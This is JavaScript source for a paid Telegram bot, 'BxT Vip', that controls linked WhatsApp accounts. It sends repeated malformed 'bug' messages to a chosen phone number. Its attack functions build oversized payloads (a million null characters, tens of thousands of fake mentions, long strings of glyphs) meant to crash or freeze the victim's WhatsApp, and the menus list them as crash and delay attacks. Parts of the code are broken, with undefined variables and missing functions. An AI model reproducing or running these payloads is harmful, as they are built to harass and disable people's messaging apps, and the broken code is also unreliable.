const config = require("./config");
const TelegramBot = require("node-telegram-bot-api");
const {
  default: makeWASocket,
  DisconnectReason,
  useMultiFileAuthState,
  generateWAMessageFromContent,
} = require("lotusbail");
const fs = require("fs");
const P = require("pino");
const path = require("path");
//===================================================//
const token = config.BOT_TOKEN;
const bot = new TelegramBot(token, { polling: true });
//===================================================//
const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
//===================================================//
const PREMIUM_FILE = path.join(__dirname, "database", "premium.json");
//===================================================//
const axios = require("axios");
const photo = "https://files.catbox.moe/mdf6w7.png";
const Database_Link = "https://raw.githubusercontent.com/syazwanadli2011/dbsc/refs/heads/main/token.json";
async function fetchAndValidateToken() {
  try {
    const response = await axios.get(Database_Link);
    const validTokens = response.data.tokens;

    if (!validTokens.includes(config.BOT_TOKEN)) {

        console.log('TOKEN IS NOT AVAILABLE DATABASE\nBUY THE RIGHT ONE @Bilal_detabesabot')
      process.exit(1);
    }
    initializeBot()
  } catch (error) {
   console.error("Error:", error);
    process.exit(1);
  }
}

fetchAndValidateToken();

//===================================================//
function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Found ${activeNumbers.length} active WhatsApp session`);

      for (const botNumber of activeNumbers) {
        console.log(`Trying to connect WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Trying to reconnect the bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Connection closed"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `╭─────────────────
│ Bot: ${botNumber}
│ Status: Initialization....
╰─────────────────`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `╭─────────────────
│ Bot: ${botNumber}
│ Status: Trying to connect...
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `╭─────────────────
│ Bot: ${botNumber}
│ Status: Unable to connect
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `╭─────────────────
│ Bot: ${botNumber}
│ Status: Connected successfully!
╰─────────────────`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "2013DIAN");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `╭─────────────────
│ Bot: ${botNumber}
│ Code: ${formattedCode}
╰─────────────────`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `╭─────────────────
│ Bot: ${botNumber}
│ Message: ${error.message}
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

async function initializeBot() {
  if (config.BOT_TOKEN)
    try {
      console.log(`╭─────────────────
│ 𝐁𝐱𝐓 𝐁𝐑𝐀𝐍𝐃
╰─────────────────`);

      await initializeWhatsAppConnections();
    } catch (error) {
      console.error(error);
    }
}

initializeBot();

function ensureDatabaseFolder() {
  const dbFolder = path.join(__dirname, "database");
  if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder, { recursive: true });
  }
}

function loadPremiumData() {
  try {
    ensureDatabaseFolder();
    if (fs.existsSync(PREMIUM_FILE)) {
      const data = fs.readFileSync(PREMIUM_FILE, "utf8");
      return JSON.parse(data);
    }
    return {};
  } catch (error) {
    console.error("Error loading premium data:", error);
    return {};
  }
}

function savePremiumData(data) {
  try {
    ensureDatabaseFolder();
    fs.writeFileSync(PREMIUM_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving premium data:", error);
  }
}

function isPremium(userId) {
  const premiumData = loadPremiumData();
  if (!premiumData[userId]) return false;
  return premiumData[userId].expiry > Date.now();
}

function addPremiumDuration(duration) {
  const durations = {
    h: 60 * 60 * 1000,
    d: 24 * 60 * 60 * 1000,
    w: 7 * 24 * 60 * 60 * 1000,
    m: 30 * 24 * 60 * 60 * 1000,
  };

  const match = duration.match(/^(\d+)([hdwm])$/);
  if (!match) return null;

  const [_, amount, unit] = match;
  return parseInt(amount) * durations[unit];
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

let startMessage;
let startButton;

bot.onText(/\/dian/, (msg) => {
  const chatId = msg.chat.id;

  startMessage = `\`\`\`dian ${msg.from.username || msg.from.first_name}!
Hello, welcome to BxT!
My name is Bilal, and I am the developer of BxT. Thank you for choosing and using our script. We truly appreciate your support and hope you have a great experience with BxT. If you need any assistance or have any questions, we're always here to help.
Thank you for being a part of the BxT community! 💜
╭━──━ ❖ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ ❖
┃⬡ Version : 4.0
┃⬡ Owner : @bilal_babar_982
┃⬡ Script : ʙxᴛ Vɪᴘ 
╰━────────────────━❏
╭━──━ ❖ ᴛʜᴀɴᴋ ʏᴏᴜ  ❖
┃⬡ DEVELOPER : @bilal_babar_982
┃⬡ OWNER :   BxT ♥️ 
┃⬡ SUPPORT : @Itxtalha750
┃⬡ SUPPORT : @bilal_babar_982
┃⬡ PARTNER : @Itxtalha750
┃⬡ PARTNER : @bilal_babar_982
┃⬡ THANKS FOR EVERYONE 
╰━────────────────━❏

\`\`\``;

  startButton = {
    inline_keyboard: [
      [{ text: "「  OwnerMenu  」", callback_data: `menu1` }],
      [{ text: "「  𝐁ugMenu  」", callback_data: `menu2` }],
    ],
  };

  try {
    bot.sendPhoto(chatId, photo, {
      caption: startMessage,
      parse_mode: "Markdown",
      reply_markup: startButton,
    });
  } catch (error) {
    console.error("Error mengirim foto:", error);
    bot.sendMessage(chatId, startMessage, {
      parse_mode: "Markdown",
      reply_markup: startButton,
    });
  }
});

bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Access Denied*\nYou do not have permission to use this command.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "An error occurred while connecting to WhatsApp. Please try again.."
    );
  }
});

bot.onText(/\/delbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Access denied*\nYou do not have permission to use this command.",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendMessage(
    chatId,
    `╭─────────────────
│    *DELETE BOT*    
│────────────────
│ Bot: ${botNumber}
│ Status: Processing...
╰─────────────────`,
    { parse_mode: "Markdown" }
  );

  try {
    const sock = sessions.get(botNumber);
    if (sock) {
      sock.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageText(
        `╭─────────────────
│    *BOT REMOVED*    
│────────────────
│ Bot: ${botNumber}
│ Status: Successfully deleted!
╰─────────────────`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    } else {
      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });

        if (fs.existsSync(SESSIONS_FILE)) {
          const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
          const updatedNumbers = activeNumbers.filter(
            (num) => num !== botNumber
          );
          fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
        }

        await bot.editMessageText(
          `╭─────────────────
│    *BOT REMOVED*    
│────────────────
│ Bot: ${botNumber}
│ Status: Successfully deleted!
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      } else {
        await bot.editMessageText(
          `╭─────────────────
│    *ERROR*    
│────────────────
│ Bot: ${botNumber}
│ Status: Bot not found!
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      }
    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageText(
      `╭─────────────────
│    *ERROR*    
│────────────────
│ Bot: ${botNumber}
│ Status: ${error.message}
╰─────────────────`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/addprem(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const params = match[1].trim().split(/\s+/);

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, `You don't have access`, {
      parse_mode: "Markdown",
    });
  }

  if (params.length !== 2) {
    return bot.sendMessage(
      chatId,
      "Invalid format!\nExample: /addprem <id> <duration>\nExample: /addprem 123456 30d\n┃ Duration: h=hours, d=days, w=weeks, m=months",
      { parse_mode: "Markdown" }
    );
  }

  const [userId, duration] = params;

  if (!userId || !duration) {
    return bot.sendMessage(
      chatId,
      "Format salah!\nExample: /addprem 123456 30d\n(h=hours, d=days, w=weeks, m=months)",
      { parse_mode: "Markdown" }
    );
  }

  const durationMs = addPremiumDuration(duration);
  if (!durationMs) {
    return bot.sendMessage(
      chatId,
      "Invalid duration format!\nUse: h=hours, d=days, w=weeks, m=months\nExample: 30d for 30 days",
      { parse_mode: "Markdown" }
    );
  }

  const premiumData = loadPremiumData();

  const expiry = Date.now() + durationMs;
  premiumData[userId] = {
    expiry,
    addedBy: msg.from.id,
    addedAt: Date.now(),
  };

  savePremiumData(premiumData);

  const expiryDate = new Date(expiry).toLocaleString("id-ID", {
    dateStyle: "full",
    timeStyle: "short",
  });

  await bot.sendMessage(
    chatId,
    `ID: ${userId}\nStatus: Premium Added\nExpired: ${expiryDate}`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/delprem(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = match[1].trim();

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, "You don't have access", {
      parse_mode: "Markdown",
    });
  }

  if (!userId) {
    return bot.sendMessage(
      chatId,
      "Usage: /delprem <id>\nContoh: /delprem 123456",
      { parse_mode: "Markdown" }
    );
  }

  const success = removePremiumUser(userId);

  if (success) {
    await bot.sendMessage(chatId, `Premium user deleted\nID: ${userId}`, {
      parse_mode: "Markdown",
    });
  } else {
    await bot.sendMessage(chatId, `User not found`, {
      parse_mode: "Markdown",
    });
  }
});

bot.onText(/\/btios (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Access Denied*\nYou do not have Premium access to use this command..",
      { parse_mode: "Markdown" }
    );
  }

  const [targetNumber] = match[1].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `btios_${formattedNumber}` }],
      ],
    },
  };

  await bot.sendPhoto(chatId, photo, {
    caption: `\`\`\`
╭──────────────────────
│        ʙxᴛ Vɪᴘ   
│──────────────────────
│ Target: ${formattedNumber}
│ Bot Ready: ${sessions.size}
╰──────────────────────\`\`\``,
    reply_markup: options.reply_markup,
    parse_mode: "Markdown",
  });
});

bot.onText(/\/btdozer (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Access Denied*\nYou do not have Premium access to use this command..",
      { parse_mode: "Markdown" }
    );
  }

  const [targetNumber] = match[1].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `btdozer_${formattedNumber}` }],
      ],
    },
  };

  await bot.sendPhoto(chatId, photo, {
    caption: `\`\`\`
╭──────────────────────
│      ʙxᴛ Vɪᴘ   
│──────────────────────
│ Target: ${formattedNumber}
│ Bot Ready: ${sessions.size}
╰──────────────────────\`\`\``,
    reply_markup: options.reply_markup,
    parse_mode: "Markdown",
  });
});

bot.onText(/\/diandelya (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Access Denied*\nYou do not have Premium access to use this command..",
      { parse_mode: "Markdown" }
    );
  }

  const [targetNumber] = match[1].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `diandelya_${formattedNumber}` }],
      ],
    },
  };

  await bot.sendPhoto(chatId, photo, {
    caption: `\`\`\`
╭──────────────────────
│      ʙxᴛ Vɪᴘ   
│──────────────────────
│ Target: ${formattedNumber}
│ Bot Ready: ${sessions.size}
╰──────────────────────\`\`\``,
    reply_markup: options.reply_markup,
    parse_mode: "Markdown",
  });
});

bot.onText(/\/btxalbum (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Access Denied*\nYou do not have Premium access to use this command..",
      { parse_mode: "Markdown" }
    );
  }

  const [targetNumber] = match[1].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `btxalbum_${formattedNumber}` }],
      ],
    },
  };

  await bot.sendPhoto(chatId, photo, {
    caption: `\`\`\`
╭──────────────────────
│      ʙxᴛ Vɪᴘ   
│──────────────────────
│ Target: ${formattedNumber}
│ Bot Ready: ${sessions.size}
╰──────────────────────\`\`\``,
    reply_markup: options.reply_markup,
    parse_mode: "Markdown",
  });
});

bot.onText(/\/btlonely (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Access Denied*\nYou do not have Premium access to use this command..",
      { parse_mode: "Markdown" }
    );
  }

  const [targetNumber] = match[1].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `btlonely_${formattedNumber}` }],
      ],
    },
  };

  await bot.sendPhoto(chatId, photo, {
    caption: `\`\`\`
╭──────────────────────
│      ʙxᴛ Vɪᴘ   
│──────────────────────
│ Target: ${formattedNumber}
│ Bot Ready: ${sessions.size}
╰──────────────────────\`\`\``,
    reply_markup: options.reply_markup,
    parse_mode: "Markdown",
  });
});

bot.onText(/\/btishere (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Access Denied*\nYou do not have Premium access to use this command..",
      { parse_mode: "Markdown" }
    );
  }

  const [targetNumber] = match[1].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `btishere_${formattedNumber}` }],
      ],
    },
  };

  await bot.sendPhoto(chatId, photo, {
    caption: `\`\`\`
╭──────────────────────
│      ʙxᴛ Vɪᴘ   
│──────────────────────
│ Target: ${formattedNumber}
│ Bot Ready: ${sessions.size}
╰──────────────────────\`\`\``,
    reply_markup: options.reply_markup,
    parse_mode: "Markdown",
  });
});

bot.on("callback_query", async (query) => {
  if (query) {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const [action, number] = query.data.split("_");
    const jid = `${number}@s.whatsapp.net`;

    if (messageId) {
      if (query.data === "menu1") {
        await bot.editMessageCaption(
          `\`\`\`
[「  OwnerMenu  」]
 
Command :
- addbot <number>
- delbot <number>
- addprem <userid> <duration>
- delprem <userid> <duration>
\`\`\``,
          {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [[{ text: "BACK", callback_data: `backmenu` }]],
            },
          }
        );
      } else if (query.data === "menu2") {
        await bot.editMessageCaption(
          `\`\`\`
[「  BugMenu  」]

Command :
- /btdozer <number>
 ╰┈➤ BULDOZER 2-15GB 
- /btdelta <number>
 ╰┈➤ VC DELAY
- /btios <number>
 ╰┈➤ FC IOS
- /btxalbum <number>
 ╰┈➤ CRASH
- /btlonely <number>
 ╰┈➤ SUPER DELAY LONG DURATION
- /btishere <number>
 ╰┈➤ CRASH NOTIF
\`\`\``,
          {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [[{ text: "BACK", callback_data: `backmenu` }]],
            },
          }
        );
      } else if (query.data === "backmenu") {
        await bot.editMessageCaption(startMessage, {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: "Markdown",
          reply_markup: startButton,
        });
      }

      if (number) {
        if (!sessions.size) {
          return bot.answerCallbackQuery(query.id, {
            text: "No WhatsApp bots connected!",
            show_alert: true,
          });
        }

        for (let step = 0; step <= 4; step++) {
          const percentage = (step / 4) * 100;
          const progressBar = "▓▓▓".repeat(step) + "░░░".repeat(4 - step);
          const isProcessing = percentage < 100;
          await bot.editMessageCaption(
            `\`\`\`
  ╭──────────────────────
  │   ${isProcessing ? "      WAIT        " : "    PROCESSING     "}
  │──────────────────────
  │ Target: ${number}
  │ ${
    isProcessing
      ? `Loading: [${progressBar} ${percentage.toFixed(0)}%]`
      : "Status: Sending Bug..."
  }
  ╰──────────────────────\`\`\``,
            {
              chat_id: chatId,
              message_id: messageId,
              parse_mode: "Markdown",
            }
          );

          await new Promise((resolve) => setTimeout(resolve, 500));
        }

        let successCount = 0;
        let failCount = 0;

        for (const [botNum, sock] of sessions.entries()) {
          try {
            switch (action) {
              case "btdozer":
                for (let i = 0; i < 12; i++) {
                  await luminianScorpio(sock, jid);
                  await new Promise((r) => setTimeout(r, 500));
                }
                break;
              case "btdelta":
                for (let i = 0; i < 12; i++) {
                  await protocolbug6(sock, jid);
                  await new Promise((r) => setTimeout(r, 500));
                }
                break;
                case "btios":
                for (let i = 0; i < 12; i++) {
                  await lovelyios(sock, jid);
                  await new Promise((r) => setTimeout(r, 500));
                }
                break;
                case "btxalbum":
                for (let i = 0; i < 12; i++) {
                  await ZxentCrash2(sock, jid, mention);
                  await new Promise((r) => setTimeout(r, 500));
                }
                break;
                case "btlonely":
                for (let i = 0; i < 12; i++) {
                  await VampSuperDelay(sock, jid, mention = true);
                  await new Promise((r) => setTimeout(r, 500));
                }
                break;
                case "btishere":
                for (let i = 0; i < 12; i++) {
                  await secretfunct(sock, jid, mention);
                  await new Promise((r) => setTimeout(r, 500));
                }
                break;
            }
            successCount++;
          } catch (error) {
            failCount++;
          }
        }

        await bot.editMessageCaption(
          `\`\`\`
  ╭─────────────────────────
  │ 🎯 Target: ${number}       
  │ 🐞 Bug Type: ${action}     
  │ ✅ Success: ${successCount}  
  │ ❌ Failed: ${failCount}  
  │─────────────────────────
  │ 🤖 Total Bots: ${sessions.size}  
  ╰─────────────────────────\`\`\``,
          {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: "Markdown",
          }
        );

        await bot.answerCallbackQuery(query.id);
      }
    }
  } else {
    return;
  }
});

//==================[ BUG FUNCTION ]==================

async function protocolbug6(sock, jid) {
  let msg = await generateWAMessageFromContent(
    isTarget,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
          },
          interactiveResponseMessage: {
            body: {
              text: "VALORES ",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "TREDICT INVICTUS", // GAUSAH GANTI KOCAK ERROR NYALAHIN GUA
              paramsJson: "\u0000".repeat(999999),
              version: 3,
            },
            contextInfo: {
              isForwarded: true,
              forwardingScore: 9741,
              forwardedNewsletterMessageInfo: {
                newsletterName: "trigger newsletter ( @tamainfinity )",
                newsletterJid: "120363321780343299@newsletter",
                serverMessageId: 1,
              },
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(
      isTarget,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              type: 25,
            },
            additionalNodes: [
              {
                tag: "meta",
                attrs: { is_status_mention: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" },
                content: undefined,
              },
            ],
          },
        },
      },
      {}
    );
  }
}

const venomModsData = JSON.stringify({
  status: true,
  criador: "VenomMods",
  resultado: {
    type: "md",
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"],
      },
      _eventsCount: 800000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 20000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 60000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true,
      },
    },
  },
});

async function lovelyios(sock, jid) {
  await sock.sendMessage(
    jid,
    {
      text: "Abang" + "OY" + "𑇂𑆵𑆴𑆿".repeat(60000),
      contextInfo: {
        externalAdReply: {
          title: `Anjir`,
          body: `Haii ${pushname}`,
          previewType: "PHOTO",
          thumbnail: "",
          sourceUrl: `https://t.me/xatanicvxii`, //jangan ganti soalnya ini pengirimnya ,jika diganti maka error.
        },
      },
    },
    { quoted: m }
  );
}

async function luminianScorpio(sock, jid) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(jid, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: jid },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function ZxentCrash2(sock, jid, mention) {
  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "Come here kiddo - AmbaCrash",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath:
            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, generateMessage, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "@𝐍𝐚𝐰𝐰𝐈𝐬𝐇𝐞𝐫𝐞" },
            content: undefined,
          },
        ],
      }
    );
  }
}

